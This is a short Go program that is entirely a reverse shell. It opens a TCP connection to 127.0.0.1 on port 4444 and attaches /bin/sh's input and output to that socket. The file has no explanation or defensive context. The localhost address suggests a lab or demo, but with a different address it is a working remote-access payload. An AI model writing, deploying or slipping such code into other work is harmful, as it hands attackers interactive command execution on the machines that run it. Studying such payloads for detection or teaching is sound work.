package main

import (
    "net"
    "os/exec"
)

func main() {
    socket, _ := net.Dial("tcp", "127.0.0.1:4444")
    reverse_shell := exec.Command("/bin/sh")
    reverse_shell.Stdin = socket
    reverse_shell.Stdout = socket
    reverse_shell.Stderr = socket
    reverse_shell.Run()
}

